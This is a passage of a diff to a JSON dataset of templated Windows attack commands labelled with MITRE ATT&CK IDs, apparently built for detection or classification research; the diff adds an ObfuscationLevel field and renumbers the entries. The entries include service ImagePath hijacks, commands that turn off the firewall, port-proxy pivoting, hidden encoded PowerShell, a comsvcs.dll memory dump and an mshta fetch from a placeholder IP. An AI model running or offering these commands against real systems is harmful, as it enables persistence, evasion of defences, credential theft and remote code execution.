         "Command":"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControl001\\Services\\<vulnerable_service_name>\" \/v ImagePath \/t REG_SZ \/d \"C:\\pathto\\<payload.ext>\u201d",
         "Description":null,
         "RiskScore":null,
@@ -2725,10 +2972,11 @@
         "MitreAttackClassification":"T1601",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2183,
+        "ID":249,
         "Command":"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControl002\\Services\\<vulnerable_service_name>\" \/v ImagePath \/t REG_SZ \/d \"C:\\pathto\\<payload.ext>\u201d",
         "Description":null,
         "RiskScore":null,
@@ -2736,10 +2984,11 @@
         "MitreAttackClassification":"T1601",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2184,
+        "ID":250,
         "Command":"netsh advfirewall set currentprofile state off",
         "Description":null,
         "RiskScore":null,
@@ -2747,10 +2996,11 @@
         "MitreAttackClassification":"T1562.004",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2185,
+        "ID":251,
         "Command":"netsh interface portproxy add v4tov4 listenaddress=<ip_address> listenport=<listening_port> connectaddress=<internal_ip_address> connectport=<connect_port> protocol=tcp\u201d",
         "Description":null,
         "RiskScore":null,
@@ -2758,10 +3008,11 @@
         "MitreAttackClassification":"T1562.004",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2186,
+        "ID":252,
         "Command":"netsh advfirewall firewall add rule dir=in name=\"<name>\" program=<file_path> service=rpcss action=allow protocol=TCP localport=<port>",
         "Description":null,
         "RiskScore":null,
@@ -2769,10 +3020,11 @@
         "MitreAttackClassification":"T1562.004",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2187,
+        "ID":253,
         "Command":"powerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand <Base64_encoded_string>",
         "Description":null,
         "RiskScore":null,
@@ -2780,10 +3032,11 @@
         "MitreAttackClassification":"T1027",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2188,
+        "ID":254,
         "Command":"rundll32 comsvcs.dll,MiniDump <PID> <file_name>.bin full",
         "Description":null,
         "RiskScore":null,
@@ -2791,10 +3044,11 @@
         "MitreAttackClassification":"T1218.011",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2189,
+        "ID":255,
         "Command":"mshta.exe vbscript:(CreateObject(\"WScript.Shell\").Run(\"<file_name>.exe\",0)) (Window.Close)",
         "Description":null,
         "RiskScore":null,
@@ -2802,10 +3056,11 @@
         "MitreAttackClassification":"T1218.005",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2190,
+        "ID":256,
         "Command":"mshta.exe http[:]\/\/<IP_address>\/<file_name>.hta",
         "Description":null,
         "RiskScore":null,
@@ -2813,6 +3068,7 @@
         "MitreAttackClassification":"T1218.005",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     }
 ]
